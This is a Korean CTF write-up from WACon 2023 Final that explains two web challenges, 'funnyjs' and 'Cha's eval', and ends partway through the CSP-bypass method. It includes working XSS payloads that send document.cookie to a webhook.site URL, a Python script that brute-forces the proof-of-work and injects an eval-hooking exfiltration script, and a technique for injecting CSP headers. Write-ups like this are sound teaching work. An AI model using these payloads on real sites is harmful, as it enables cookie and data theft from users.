---
layout: post
author: jun0911
title: WACon 2023 Final CTF Writeup
tags: [CTF]
---

# [WEB] funnyjs

### TL;DR

> JavaScript의 Function 생성자 함수에서 값을 처리할때 발생하는 예외와 JS 스크립트에서 인식하는 예외의 차이의 다름을 이용한 챌린지입니다.

### Description

> do you like js?

### Analysis

```html
<head>
	<head>
		<title>funnyjs</title>
	</head>
	<body>
		<script>
			let payload = decodeURIComponent(document.location.hash.slice(1)).replaceAll(/<>/g,'');
			try{
				Function(payload);
			} catch(e){
				let scriptEl = document.createElement('script');
				scriptEl.innerText = payload;
				document.body.appendChild(scriptEl);
			}
		</script>
		<pre style="font-family: sans-serif;">
 ∧,,,∧
(  ̳• · • ̳)
/    づづ plz xss
		</pre>
	</body>
</head>
```

챌린지 파일의 index.html을 확인해보면 위와 같은 코드가 존재하는 것을 확인할 수 있습니다.

문제에서 "plz xss"와 script 태그에서 특정 조건을 통과해 XSS를 발생시켜야하는 문제라고 추측이 가능합니다.

먼저 paload 변수에 값을 할당하는 부분을 확인해보겠습니다.

```js
decodeURIComponent(document.location.hash.slice(1)).replaceAll(/<>/g,'');
```

현재 URL의 fragment 값을 받아와서 "<", ">" 태그문자가 존재하면 이를 제거한 후 URL Decoding을 진행합니다, 
그 후 payload라는 변수에 decode된 URL 값을 저장합니다.

그 이후, 예외처리문을 실행합니다.

```js
try{
    Function(payload);
} catch(e){
    let scriptEl = document.createElement('script');
    scriptEl.innerText = payload;
    document.body.appendChild(scriptEl);
}
```

Function 생성자 함수에 해당 payload 변수의 값을 인자로 넣어 예외처리문으로 감쌉니다.

만약 Function 생성자 함수에서 값을 처리하는 도중 예외가 발생하면, script 태그를 생성하고 innerText 문으로 해당 payload를 넣어주게됩니다.

즉, Function 생성자 함수에서 값을 처리할때는 예외가 발생해야하고, innerText로 payload가 저장되어 스크립트가 실행되는 과정에서는 예외가 발생해서는 안됩니다.

이를 통해 XSS를 트리거 시키게된다면 아래와 같은 bot 서버에서 해당 payload를 요청해 해당 URL을 방문하게 할 수 있습니다.

index.js를 확인해보면 bot 요청을 처리하는 코드를 확인할 수 있습니다.

```js
app.post('/report',(req,res)=>{
	let gresp = req.body['g-recaptcha-response']?.toString();
	let url = req.body.url?.toString();

	res.type('text/plain');
	if(gresp && url && (url.startsWith('http://') || url.startsWith('https://'))){
		fetch(`https://www.google.com/recaptcha/api/siteverify?secret=${captchaSecret}&response=${encodeURIComponent(gresp)}`, {
	        method: 'POST'
	    }).then(response => response.json()).then(r => {
	    	if(r.success == true){
				childProcess.spawn('node',['./bot.js',JSON.stringify(url)]);
    			res.send('Admin will visit!');
	    	} else {
				res.send('Captcha failed i guess');
	    	}
	    }).catch(error => res.send('Unknown error??'));
	} else {
		res.send('Bad params');
	}
});
```

요약해보면 캡챠를 통해 현재 bruteforce 공격을 방지하고, url이 http:// 또는 https://로 시작하는지 검사합니다.

검사에 통과하게 된다면, bot.js에 전달 받은 url 값을 인자로 넣어 서버를 실행하고 "Admin will visit!" 이라는 메시지를 반환합니다.

여기서 bot.js는 전달받은 url 인자를 아래와 같이 처리하게됩니다.

```js
#!/usr/bin/env node
const puppeteer = require('puppeteer')

const flag = process.env.FLAG || 'WACON2023{test-flag}';

async function visit(url){
	let browser;

	if(!/^https?:\/\//.test(url)){
		return;
	}

	try{
		browser = await puppeteer.launch({
		    pipe: true,
		    args: [
		        "--no-sandbox",
		        "--disable-setuid-sandbox",
		        "--js-flags=--noexpose_wasm,--jitless",
		        "--ignore-certificate-errors",
		    ],
		    executablePath: "/usr/bin/google-chrome-stable",
		    headless: 'new'
		});

		let page = await browser.newPage();

		await page.setCookie({
			httpOnly: false,
			name: 'FLAG',
			value: flag,
			domain: 'web',
			sameSite: 'Lax'
		});

		page = await browser.newPage();
		await page.goto(url,{ waitUntil: 'domcontentloaded', timeout: 2000 });
		await new Promise(r=>setTimeout(r,3000));
	}catch(e){ console.log(e) }
	try{await browser.close();}catch(e){}
	process.exit(0)
}

visit(JSON.parse(process.argv[2]))
```

해당 코드에서도 url이 http://, 또는 https://로 시작하는지 검자를 먼저 진행합니다.

그 후 puppeteer 모듈을 사용해서 browser를 열게 됩니다. 해당 브라우저에서 접속하기 전 cookie를 설정합니다.

```js
await page.setCookie({
    httpOnly: false,
    name: 'FLAG',
    value: flag,
    domain: 'web',
    sameSite: 'Lax'
});
```

cookie를 설정하면, FLAG라는 키라는 쿠키를 생성하고 process.env에 존재하는 flag 값을 쿠키 값으로 설정하게됩니다.

그 이후 전달받은 url 파라미터를 실제로 flag 쿠키가 설정된 browser에서 방문하게됩니다.

정리히면 일단 XSS를 조건에 맞게 트리거 시킨 후 bot으로 요청하게한다면 bot이 해당 url을 방문하면서 동일하게 xss가 트리거 되고, flag 쿠키 값을 공격자의 서버로 전달시키도록 할 수 있습니다.

### Payload

먼저, Function 생성자 함수는 인수로 전달받은 값을 함수로 변환하는 작업을 진행합니다.

예를 들어서 alert(1)이라는 문자를 Function 생성자 함수로 전달하게 된다면, 이를 함수로 만들기 위해 변환하려고 시도합니다. 만약 변환이 실패하게 된다면 오류가 발생됩니다.

하지만 Function 생성자 함수는 상대적으로 오류에 대해 관대하고, 왠만한 오류는 그냥 무시하고 예외를 발생시키지 않습니다. (null.obj() 를 Function 생성자 함수의 인자로 보내주게 된다면 이를 에러로 발생시키지 않습니다.)

여러가지 방법을 생각해봤을때 주석(개행)을 사용하게 된다면 Function 함수에서는 에러를 발생시키고, 스크립트를 실행시킬 수 있습니다.

```js
alert(1)
//
let 2as
```

아래와 같은 payload를 확인해보겠습니다.

```js
alert(1);//%0alet 24a
```

먼저 let 24a는 javascript의 변수 명명 규칙을 위반하는 생성방법입니다. (숫자가 변수명의 맨 앖에 위치할 수 없습니다.)

Function 생성자함수는 해당 규칙을 위반하였음으로 오류를 발생시키게됩니다, 하지만 오류가 발생하고 innerText로 payload가 삽입될 때에는 %0a라는 개행문자가 무시되고 결과적으로 let 24a라는 문자가 주석처리됩니다.

아래와 같은 원리로 동작합니다.

```
payload = "alert(1);//%0alet 23a";

Function(payload) -> %0a(\n) alert(1); // \n let 23a -> "Error"

element.innerText = payload -> alert(1) // let 23a -> "Ok"
```

해당 payload를 그대로 챌린지 사이트에 넣고 실행해보면 XSS가 트리거되는 것을 알 수 있습니다.

![Alt text](https://blog.kakaocdn.net/dn/C5euO/btsv7Bh8RQq/Na1rA2b3WEnBkCF6xirqF1/img.png)

이를 이용해서 webhook을 이용해 사이트의 쿠기값을 보내게하는 코드를 작성하게 된다면, bot으로 요청을 보냈을 때 webhook으로 저장된 flag 쿠키가 보내지게 될 것입니다.

### Exploit

요구조건에 맞는 Exploit payload를 아래와 같이 작성합니다.

```js
location.href="https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
```

해당 payload를 bot으로 보내게 된다면 성공적으로 Exploit에 성공하여, FLAG를 얻을 수 있습니다.

여기서 주의할점은 방문할 URL의 host를 bot 서버의 host로 지정해주어야 성공적으로 cookie값을 읽어올 수 있습니다.

docker-compose 파일을 확인해보면 어디로 요청을 보내야 FLAG 쿠키를 읽을 수 있는지 알 수 있습니다.

```yml
version: "3.9"
services:
  bot:
    build: ./bot/
    restart: always 
    environment:
      - "FLAG=WACON2023{test-flag}"
      - "CAPTCHA_SECRET="
    ports:
      - "8001:8000"
  web:
    image: nginx
    restart: always 
    ports:
      - "8000:80"
    volumes:
      - ./app/static:/var/www/html:ro
      - ./app/nginx.conf:/etc/nginx/conf.d/default.conf:ro
```

해당 payload가 성공적으로 작동하기위해서는 챌린지의 서버로 요청을 보내야하는데, 도메인이 "web"인 것을 알아낼 수 있습니다.

그러면 payload를 아래와 같이 구성해주어야합니다.

```js
http://web/#location.href="
https://webhook.site/b1d8c7e2-0203-453e-b7c6-8d36d365655c/?"+document.cookie;//%0alet 23a
```

webhook을 확인해보면 성공적으로 FLAG 쿠키를 읽어온 것을 볼 수 있습니다.

![Alt text](https://blog.kakaocdn.net/dn/cImwnR/btsv9LxzDmD/O9reMfu4Ncc84kSk0fcSx1/img.png)

#### FLAG : ``WACON2023{that-wasnt-so-funny-abc32f}``

# [WEB] Cha's eval

### TL;DR

> Eval Hooking 또는 CSP Bypass를 이용한 챌린지입니다.

### Description

> Do you know how JS eval() works? Then, how about these comments?
> 
> Note: The web server is running on 80 port inside the docker. (8000 => 80)

### Analyzsis

챌린지 사이트에 처음 접속해보면 아래와 같은 페이지를 확인해볼 수 있습니다.

![Alt text](https://blog.kakaocdn.net/dn/dNB18q/btsv0vW8bu7/hKbJufIAOzHAruzc1Knvk0/img.png)

script와 header, pow라는 3가지의 입력값을 받고 있는 것을 확인해볼 수 있습니다.

여기서 값을 입력하고 Submit 버튼을 누르게된다면 submit.php로 입력한 값들이 전달되게됩니다.

```php
<?php

include "config.php";

function error($msg) {
    die("
        <script>
            alert('$msg');
            //location.href = 'index.php';
        </script>
    ");
}

$header = $_POST["header"];
$script = $_POST["script"];
$pow = $_POST["pow"];

if(!isset($header) || !isset($script) || !isset($pow)) {
    error("Missing parameter");
}

if (!check_pow($pow)) {
    gen_pow();
    error('Wrong pow');
}
gen_pow();

$header = bin2hex($header);
$script = bin2hex($script);

do {
    $key = sha1(random_bytes(32).time().random_bytes(32));
    $contentfile = "./data/".sha1($SALT.$key);;
} while (file_exists($contentfile));

file_put_contents($contentfile, "$header\n$script");

$param = escapeshellarg($key);
exec("node /app/bot.js {$param}");
```

먼저, 입력한 값들이 모두 비어있지 않은지 검사를 진행하고, 비어있지 않다면 check_pow 함수를 이용해 입력받은 pow를 검사하는 작업을 진행합니다.

pow 검사를 통과하면 gen_pow 함수를 실행시키고 입력받은 header와 script 값을 hex로 변환한 후 재할당을 진행합니다.

그리고 filename에 사용될 키를 생성하게 되는데, 해당 키는 랜덤한 32바이트의 sha1 인코딩을 진행한 값입니다.

해당 filename을 key라는 변수에 저장하고 $SALT라는 기본값과 $key 값을 더해 sha1 인코딩을 진행한 값을 filename으로 사용합니다.

그리고 파일이 존재하지 않으면 위와 같은 작업으로 파일이름을 생성하고 파일이 정상적으로 생성되었는지 확인한 후 do ... while 문을 종료합니다.

그 후, 생성된 파일명으로 아까 hex로 변환한 header와 script 값을 개행을 이용해 구분하여 파일 값으로 저장하게됩니다.

이와 같은 작업이 모두 끝나게 된다면 랜덤하게 생성된 $key 값을 escapeshellarg 함수를 이용해 command injection을 방지합니다.

마지막으로 node /app/bot.js 파일로 이스케이프된 $key 값을 전달합니다.

bot.js에서는 아래와 같은 작업을 진행합니다.

```js
const puppeteer = require('puppeteer');

if (process.argv.length != 3) {
	console.error("Invalid invoke");
	process.exit(1);
}

let key = process.argv[2];
const url = "http://localhost/run.php?key=" + key;

(async () => {
  const browser = await puppeteer.launch({
      executablePath: '/usr/bin/google-chrome',
	  args: ['--no-sandbox', '--disable-setuid-sandbox'],
  });
  const page = await browser.newPage();
  page.setDefaultNavigationTimeout(3000);
  await page.goto(url);
  await new Promise(r => setTimeout(r, 17000));
  await browser.close();
})();
```

해당 코드에서 key는 process.argv[2] (명령라인에서 2번째 인자 ($key 변수 값과 매칭))를 사용합니다.

그리고 저장된 key를 이용해서 "http://localhost/run.php?key="+key로 요청을 보냅니다.

URL로 요청을 보낼 때 puppeteer 모듈을 이용하여 새로운 브라우저를 생성한 후 해당 브라우저에서 URL을 방문하도록 합니다.

이제 이렇게 전달받은 key를 run.php에서 어떻게 처리해야하는지 확인해봐야합니다.

```php
<?php 
include "config.php";

$nonce = substr(sha1(random_bytes(32)), 16);

header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );

$key = isset($_GET["key"]) ? $_GET["key"] : "NOPE";
if ($key === "NOPE") {
    die("no");
}


$key = sha1($SALT.$key);
$contentfile = "./data/$key";
if (!file_exists($contentfile)) {
    die("no");
}

$contentdata = file_get_contents($contentfile);

unlink($contentfile);
if (file_exists($contentfile)) { 
    die("no");
}

$data = explode("\n", $contentdata);

$header = hex2bin(trim($data[0]));
$script = hex2bin(trim($data[1]));

header($header, false);
?>

<html>
    <head>
        <div id="flag_container">
            <script nonce="<?=$nonce?>">
                window.setTimeout(() => {
                    
                    let tester = 0, tmp = 0;
                    <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>
                    
                    // no winning race
                    tmp = 0;
                    for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                        tmp += 1;

                    // never pollute eval
                    tester = 0;
                    eval("tester = 1");
                    if(tester === 0) {
                        return;
                    }
                    
                    // no winning race
                    tmp = 0;
                    for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                        tmp += 1;

                    eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
                    <?php } ?>

                }, 2000);
            </script>
        </div>
    </head>
    <body>
        <script nonce="<?=$nonce?>">
            (() => { 
                let flag_container = document.getElementById("flag_container");
                document.body.removeChild(flag_container);
                window.setTimeout = window.setInterval = null;
            })();
        </script>

        <script nonce="<?=$nonce?>">
            // User code goes here
            <?= $script ?>
        </script>
    </body>
</html>
```

요약해서 설명하면, 가장 먼저 CSP와 랜덤한 값의 nonce가 설정됩니다.

그 이후 bot.js로부터 전달받은 key와 $SALT 값을 더해 sha1 인코딩을 진행한 후 해당 파일명과 해당하는 파일이 존재하는지 확인합니다.

파일이 존재한다면 해당 파일을 열고, $contentdata에 파일 내용을 저장한 다음 unlink 함수로 해당 파일을 삭제합니다.

그리고 파일이 삭제되었는지 확인을 진행한 후, $contentdata를 \n 기준으로 split을 진행합니다.

아까 $header\n$script 순으로 파일 내용을 저장하였음으로 똑같이 개행문자를 기준으로 split을 진행하여 $header와 $script 값을 가져온 후 이를 hex2bin 을 이용해 원래의 ascii로 되돌리는 작업을 진행합니다.

ascii로 값들이 복원되어 저장되었다면 $header 변수에 있는 값을 header 함수의 인수로 사용합니다, 이때 header 함수의 2번째 인수가 false로 설정되어있음으로 http 헤더가 중복으로 설정될 경우 기존 값을 유지하면서 새로운 값을 추가하도록 합니다.

기본 설정작업이 끝나면 nonce 값을 이용해 script가 실행되도록 합니다.

가장 먼저 실행되는 script는 아래와 같습니다.

```php
<script nonce="<?=$nonce?>">
    // User code goes here
    <?= $script ?>
</script>
```

사용자가 파일에서 입력했던 $script 값을 그대로 사용하는 것을 확인할 수 있습니다.

2초뒤에는 아래와 같은 script가 실행됩니다.

```php
<div id="flag_container">
    <script nonce="<?=$nonce?>">
        window.setTimeout(() => {

            let tester = 0, tmp = 0;
            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>

            // no winning race
            tmp = 0;
            for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                tmp += 1;

            // never pollute eval
            tester = 0;
            eval("tester = 1");
            if(tester === 0) {
                return;
            }

            // no winning race
            tmp = 0;
            for(let i = 0; i < <?=random_int(500, 1000)?>; i++)
                tmp += 1;

            eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
            <?php } ?>

        }, 2000);
    </script>
</div>
```
먼저 teseter와 tmp 값을 설정한 후, $FLAG의 길이만큼 반복을 진행합니다. 이때 레이스컨디션이 발생하지 않도록 반복문과 tmp 값을 이용해 설정해주고 있는 것을 확인할 수 있습니다.

그리고 tester 값을 0으로 설정한 후 eval 함수를 이용해 tester 값을 1로 변경합니다.

만약에 eval이 작동하지 않아 tester 값이 0일경우는 return으로 코드를 실행하지 않습니다.

조건이 통과하게 된다면 한번더 레이스컨디션 방지 코드가 실행된 후 eval로 주석처리된 $flag[$i] = $FLAG[$i]와 같이 $FLAG 값의 문자를 1문자씩 주석처리를 진행 후 eval로 실행하는 것을 확인할 수 있습니다.

이와 같은 작업이 실행되고 난 후, 아래의 script가 실행되어서 settimeout 스크립트가 실행되는 컨테이너를 지워버립니다.

```php
<script nonce="<?=$nonce?>">
    (() => { 
        let flag_container = document.getElementById("flag_container");
        document.body.removeChild(flag_container);
        window.setTimeout = window.setInterval = null;
    })();
</script>
```

해석하면 flag_container로 2초 뒤에 1문자씩 $FLAG의 값을 주석처리한 eval를 실행한 후 완료되면 해당 flag_container를 바로 삭제해버리는 코드입니다.

### Pow Leak

일단 먼저, header나 script를 실행시키기 위해서는 pow를 맞춰야합니다.

아래는 config.php의 pow 설정 방법입니다.

```php
<?php

$FLAG = "WACon2023{REDACTED}";
$SALT = "REDACTED";

session_start();

function gen_pow($len = 5) {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%";
    $nonce = "";
    $check = "";
    for($i = 0; $i < $len; $i++) {
        $nonce .= $str[random_int(0, strlen($str) - 1)];
        $check .= $str[random_int(0, strlen($str) - 1)];
    }

    $ans = sha1($nonce . $check);

    $_SESSION["pow_nonce"] = $nonce;
    $_SESSION["pow_answer"] = $ans;

    return array($nonce, $ans);
}

function check_pow($input) {
    $check = sha1($_SESSION["pow_nonce"] . $input);
    return $check === $_SESSION["pow_answer"];
}
```
config.php 코드에서는 챌린지의 FLAG와 SALT를 지정해놓습니다, 그 후 pow를 생성하고 검증하는 함수를 정의합니다.

gen_pow 함수에서는 pow를 생성하는 함수를 정의합니다, 5자 길이의 랜덤한 ascii 문자의 pow를 생성합니다.

pow를 생성할때 nonce와 check라는 값을 생성하는데, nonce의 길이와 check의 길이는 5자로 고정입니다.

nonce와 check를 더해서 sha1 encrypt를 진행한 값을 pow_answer로 지정합니다.

그 이후, check_pow 함수에서는 입력받은 pow를 검증하는 작업을 진행합니다, 입력받은 pow를 phpsession에 저장되어있는 pow_nonce와 더해서 sha1을 encrypt를 진행한 값이 pow_answer와 일치하는지 확인한 후 boolean을 반환합니다.

챌린지에서는 사전에 pow_nonce와 pow_answer 값을 알려줍니다.

그러면 알려진 pow_nonce와 5자 길이의 생성된 check 값을 더한 후 sha1을 진행해 pow_answer와 일치하는지 비교하는 bruteforce 코드를 작성해서 숨겨진 pow_check 값을 알아낼 수 있습니다.

현재 랜덤하게 생성되는 아스키 문자열의 길이는 약 35 정도입니다. 이를 5번 매칭한다고 진행했을때 35의 5제곱만큼 반복한다면 check_pow를 알아낼 수 있습니다. (약 6천만번)

```python
import hashlib
import requests
import random
import itertools

script = open('script.js', 'r').read()

ascii = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"

nonce = ""
check = ""

flag = 0

hashText = ""

def sha1(text):
    m = hashlib.sha1()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

res = requests.get("http://58.229.185.61:8000/index.php", cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
})

nonce = res.text.split("sha1")[1].split("==")[0].split('"')[1]

hashText = res.text.split("sha1")[1].split("==")[1].split("</code>")[0].strip()

leakCheck = ""

for brute in itertools.product(ascii, repeat=5):
    check = ''.join(brute)
    if sha1(nonce + check) == hashText:
        leakCheck = check
        print("hash leak!, check : ", check)
        break
```

gen_pow함수가 계속실행된다면 브루트포스를 이용해서도 check_pow값을 알아낼 수 없겠지만 처음 index.php를 접속할때와 submit.php를 진행할때는 pow값이 동일하기 때문에 브루트포싱을 할 수 있습니다.

위 Exploit 코드와 같이 index.php의 페이지에서 nonce와 hash을 가져온 후 내부적으로 브루트포스를 통해 check_pow를 leak을 진행하면 pow를 알아낼 수 있습니다.

이렇게 pow를 얻어내면, 이제 script와 header 값을 통해 공격을 진행할 수 있습니다.

### Scenario

해당 챌린지의 공격 방법은 총 2가지가 존재합니다.

```
1. eval 함수 후킹
2. CSP Bypass & HTML Leak
```

### 1. eval 함수 후킹

가장 간단하게 챌린지를 해결할 수 있는 방법입니다.

아래와 같이 $FLAG 문자를 주석처리 후 실행할때 eval 함수를 사용하는 것을 알 수 있습니다.

```php
<div id="flag_container">
    <script nonce="<?=$nonce?>">
        window.setTimeout(() => {
            let tester = 0, tmp = 0;
            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>

            ...

            // never pollute eval
            tester = 0;
            eval("tester = 1");
            if(tester === 0) {
                return;
            }

            ...

            eval("////////////////////////////////////////$flag[<?= $i ?>] = <?= $FLAG[$i] ?>"); 
            <?php } ?>

        }, 2000);
    </script>
</div>
```

그러면 eval 함수를 재정의해서 eval 함수를 호출할때 tester 값만 조작할 수 있다면 eval 함수를 다른 목적으로 동작하도록 사용할 수 있습니다.

예를 들어서 eval 함수가 현재는 입력받은 문자열을 javascript 코드로 실행하는 것이지만 아래와 같이 정의한다면 다르게 동작하게됩니다.

```js
eval = (data) => {
	console.log(data);
}
```

위와 같이 eval 함수를 재정의하게 된다면 아래와 같은 코드를 실행할때 javascript 코드로 실행하는것이 아닌 console에 값이 출력되게 됩니다.

```js
eval("// hello world"); -> console.log("hello world")
```

이를 이용해서 후킹으로 FLAG 값을 얻어내는 방법이 존재합니다.

### 2. CSP Bypass & HTML Leak

현재 챌린지에서는 header 함수를 이용해서 http 해더를 추가하거나 수정할 수 있습니다.

run.php는 현재 CSP가 아래와 같이 설정되어있습니다.

```php
header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );
```

하지만 입력한 $header 값을 이용해 http 헤더를 추가로 설정하거나 수정할 수 있습니다.

```php
header($header, false);
```

현재 header 함수의 두번째 인자가 false로 설정되어있습니다, 이는 http 헤더가 중복 선언될 경우, CSP는 더 높은 보안의 헤더를 적용하고, 만약 현재 설정되지 않은 값을 추가할 경우 기존 http 헤더 설정에서 값을 추가로 설정할 수 있습니다.

```
Content-Security-Policy: default-src 'none';

Content-Security-Policy: default-src 'none'; script-src: 'unsafe-eval'

-> Content-Security-Policy: default-src 'none'; script-src: 'unsafe-eval'; (추가로 설정이 적용됨)
```

이를 활용하게 되면 nonce 값을 추가할 수 있습니다, CSP의 nonce를 추가하게된다면 기존의 script 태그의 nonce는 추가된 nonce 값과 일치하지 않아 실행되지 않습니다.

스크립트가 실행되지 않으면 run.php에서 flag_container를 지우는 코드가 실행되지 않아 FLAG 값이 그대로 HTML상에 남게 되어있어 Leak을 진행할 수 있습니다. 

HTML Leak을 진행하고 난 후 위의 설정되어 있는 CSP를 우회하게 된다면 성공적으로 FLAG 값을 읽어올 수 있습니다.

### Challange Payload & Exploit (Hooking Eval)

먼저 사용되는 방법으로는 eval 함수를 재정의하여 후킹하는 방법이 존재합니다.

하지만 한가지 문제가 존재합니다. 아래와 같은 코드로 인해 eval 함수를 재정의 하는데에 어려움을 겪었습니다.

```php
<div id="flag_container">
    <script nonce="<?=$nonce?>">
        window.setTimeout(() => {
            let tester = 0, tmp = 0;
            <?php for($i = 0; $i < strlen($FLAG); $i++) { ?>

            ...

            // never pollute eval
            tester = 0;
            eval("tester = 1");
            if(tester === 0) {
                return;
            }

            ...

        }, 2000);
    </script>
</div>
```

챌린지에서 tester = 0으로 설정하고 eval을 이용해 tester 값을 1로 변경합니다, 현재 eval을 재정의할 수 있는 방법은 아래의 코드에서 재정의할 수 있는데 여기서 tester 값을 1로 변경해려면 setTimeout 함수의 내부 스코프에 접근해야합니다.

```php
<script nonce="<?=$nonce?>">
    // User code goes here
    <?= $script ?>
</script>
```

간단하게 eval("tester = 1")를 추가로 진행하도록 설정하게 된다면 eval이 실행되는 기본 스코프는 전역 스코프임으로, 
setTimeout 함수 내부에 eval 함수를 호출하지 않는 이상 밖에서 tester의 값을 변경하게되면 전역스코프의 tester 변수의 값을 변경시킵니다.

그러면 지역 스코프의 tester 변수의 값이 변경되지 않음으로 if (tester === 0) 이라는 조건에 걸리게 됩니다.

이와 같은 문제를 해결하기 위해서는 javascript의 caller/callee를 사용할 수 있습니다.

caller를 사용하면 위의 문제를 해결할 수 있습니다. caller는 자신을 호출한 함수를 가리킵니다.

그러면 eval 함수를 재정의하여 호출한 caller를 가져오고 해당 함수를 toString으로 변환하면 굳이 if (tester === 0) 조건을 통과할 필요 없이 현재 정의되어있는 함수의 코드를 가져올 수 있습니다.

아래는 eval 함수를 재정의 하여 caller를 사용해 조건을 통과할 수 있는 예시입니다.

```js
FLAG = "secretFlag";

function test() {
	tester = 0; 
    
    eval("tester = 1");
    
    if (tester === 0) { return; }
    
    // secret
    for (let i = 0; i < FLAG.length; i++) {
    	eval("// flag :" + FLAG[i]);
    }
}

eval = (data) => {
	console.log(data.caller.toString());
}

test();

/*
-> result == function test() {
	tester = 0; 
    
    eval("tester = 1");
    
    if (tester === 0) { return; }
    
    // secret
    
   eval("// flag :s");
    eval("// flag :e");
    eval("// flag :c");
    eval("// flag :r");
    eval("// flag :e");
    eval("// flag :t");
    eval("// flag :F");
    eval("// flag :l");
    eval("// flag :a");
    eval("// flag :g");
}
*/
```

caller에는 호출한 함수의 원형이 담기므로 설정되어있는 flag를 Leak할 수 있습니다.

그 이후 정규표현식을 이용해, flag 값만을 추출하여 공격자의 서버로 전달시키도록 Exploit payload를 작성할 수 있습니다.

아래는 eval hooking을 진행하여 flag를 얻어내는 exploit 코드입니다.

```js
org_eval = eval;

function myFunc() {
    console.log("OK");
    if (myFunc.caller === null) {
        console.log("The function was called from the top!");
    } else {
        let scripts = myFunc.caller.toString();
        let reg = new RegExp(/eval\(\"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\$flag\[[0-9]+\] = (.+)\"\)/g);


        const matches = scripts.matchAll(reg);
        let flags = "";

        for (const match of matches) {
            flags += match[1];
            console.log(match.index)
        }

        location.href = `https://webhook.site/ce5c0ed9-5dc9-484e-9ce4-07a487e35aa0?a=` + encodeURIComponent(flags);
        return;
    }
}

eval = myFunc
```

위 코드를 확인해보면 eval 함수를 재정의하고 있습니다, eval 함수를 호출한 caller를 가져와서 caller가 없으면 아무것도 실행하지 않고, caller가 존재한다면 scripts에 호출한 caller의 toString을 사용해 문자열을 가져옵니다.

그 이후 정규표현식을 이용해서 가져온 caller의 함수 문자열과 일치하는 부분을 가져옵니다.

이를 FLAG의 길이만큼 반복하고 flags 변수에 저장하도록 합니다. flags 변수에 모두 값이 저장되었으면, webhook을 이용해 유출한 flags 값을 보낼 수 있습니다.

전체 Full Exploit 코드입니다.

```python
import hashlib
import requests
import random
import itertools

script = open('script.js', 'r').read()

ascii = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%"

nonce = ""
check = ""

flag = 0

hashText = ""

def sha1(text):
    m = hashlib.sha1()
    m.update(text.encode('utf-8'))
    return m.hexdigest()

res = requests.get("http://58.229.185.61:8000/index.php", cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
})

nonce = res.text.split("sha1")[1].split("==")[0].split('"')[1]

hashText = res.text.split("sha1")[1].split("==")[1].split("</code>")[0].strip()

leakCheck = ""

for brute in itertools.product(ascii, repeat=5):
    check = ''.join(brute)
    if sha1(nonce + check) == hashText:
        leakCheck = check
        print("hash leak!, check : ", check)
        break


print("Send Pow : ", leakCheck)

res2 = requests.post("http://58.229.185.61:8000/submit.php", headers={
    "Content-Type": "application/x-www-form-urlencoded"
}, cookies={
    "PHPSESSID": "29c7ee02fbc11aeba1831e18e4a84581"
}, data={
    "header": "",
    "script": """
    org_eval = eval;

    function myFunc() {
        console.log("OK");
        if (myFunc.caller === null) {
            console.log("The function was called from the top!");
        } else {
            let scripts = myFunc.caller.toString();
            let reg = new RegExp(/eval\(\"\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\$flag\[[0-9]+\] = (.+)\"\)/g);


            const matches = scripts.matchAll(reg);
            let flags = "";

            for (const match of matches) {
                flags += match[1];
                console.log(match.index)
            }

            location.href = `https://webhook.site/ce5c0ed9-5dc9-484e-9ce4-07a487e35aa0?a=` + encodeURIComponent(flags);
            return;
        }
    }

    eval = myFunc
    """,
    "pow": leakCheck
})
print(res2.text)
```

위 Exploit 코드를 사용하게 되면 pow를 이용해 eval hooking 코드가 동작하게 되어서, Leak한 FLAG를 webhook으로 전달받을 수 있습니다.

#### FLAG : ``WACon2023{b6ee5fc687a677bb1baf7285dca31b675f68c9d7e6ddd8a92b84d54d41729d5e}``

### Challange Payload && Exploit (HTML Leak && CSP Bypass)

두번째 방법으로는 $header 변수를 이용해서 HTML Leak과 CSP Bypass를 진행하여 FLAG를 얻는 방법입니다.

이를, 진행하기 위해서는 아래의 함수를 적극적으로 활용하여야합니다.

```php
header($header, false);
```

위 함수를 활용하면 동일한 HTTP 헤더를 선언하여 값을 추가할 수 있습니다, 
이때 CSP 헤더를 설정할때 script-src 부분에서 nonce값이 현재 설정되어있는 상황해서 위 header 함수를 이용해서 nonce를 추가로 설정할 수 있습니다.

현재 설정되어 있는 CSP 해더는 아래와 같습니다.

```php
header("Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-$nonce'; base-uri 'none'; connect-src 'none';" );
```

아래는 현재 설정된 CSP에서 nonce 값을 추가로 설정하는 예시입니다.

```
기존 CSP
-> Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-asdovkdoaasdkaosdko'; base-uri 'none'; connect-src 'none';

header("Content-Security-Policy: script-src 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k=';", false);
-> Content-Security-Policy: script-src 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k=';

실제 적용되는 CSP
-> Content-Security-Policy: default-src 'none'; script-src 'unsafe-eval' 'nonce-asdovkdoaasdkaosdko' 'sha256-S9T+4pxwdCdgDuhSdqdsTSI3li/BHqci69Oa+iw6p7k='; base-uri 'none'; connect-src 'none';
```

